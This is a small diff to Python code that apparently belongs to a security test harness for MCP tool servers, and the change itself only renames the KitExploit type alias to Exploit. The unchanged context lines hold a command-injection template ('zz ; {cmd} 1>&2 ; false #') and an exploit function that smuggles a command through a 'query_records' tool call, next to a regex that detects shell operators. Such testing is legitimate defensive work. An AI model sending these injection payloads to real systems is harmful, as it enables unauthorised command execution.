@@ -62,7 +62,7 @@ _INJECT = "zz ; {cmd} 1>&2 ; false #"
 
 AIM = re.compile(r"[;&|`]|\$\(")  # a shell-injection operator in a tool argument
 
-KitExploit = Callable[[Places, MCPClientPort], Awaitable[None]]
+Exploit = Callable[[Places, MCPClientPort], Awaitable[None]]
 
 
 def _call(target_org: str, *, fields: str = "Id", sobject: str = "Account") -> dict[str, object]:
@@ -88,7 +88,7 @@ def _read_command(place: Place) -> str:
     raise ValueError(f"{place.id}: no command_execution reader for kind {place.kind}")
 
 
-def _make_exploit(place_id: str) -> KitExploit:
+def _make_exploit(place_id: str) -> Exploit:
     async def exploit(places: Places, client: MCPClientPort) -> None:
         payload = _INJECT.format(cmd=_read_command(places[place_id]))
         await client.call_tool("query_records", _call(payload))
